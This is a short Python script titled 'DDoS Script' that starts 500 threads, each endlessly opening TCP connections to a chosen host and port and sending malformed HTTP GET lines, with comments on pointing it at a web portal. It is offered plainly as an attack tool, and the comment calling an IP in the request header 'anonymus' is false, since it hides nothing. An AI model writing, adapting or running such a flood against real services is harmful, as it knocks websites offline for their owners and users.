##########  DDoS Script  ##########
import threading # to run multiple threads
import socket # to set-up connection

target = '127.0.0.1' ## or URL

## change port based on which port you wanna ddos
port = 80  ## as 80 is for http, it'll ddos web portal
fakeIP = '182.21.20.32'  # my anonymus ip (just in header)

connectionsEstalished = 0

###  steps of attack from single process/machine:
# 1. opens a connection
# 2. connects to it
# 3. closes the connection
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("GET /" + fakeIP + "\r\n\r\n").encode('ascii'), (target,port))
        s.close()

        global connectionsEstalished
        connectionsEstalished += 1
        '''
        if connectionsEstalished%500 == 0:
            print("Connected till now: ",connectionsEstalished)
        '''

### for ddos, the attack has to be running on several systems/threads, simultaneously 
numOfThreads = 500

## it'll creat 500 connections 
for i in range(numOfThreads):
    thread = threading.Thread(target=attack)
    thread.start()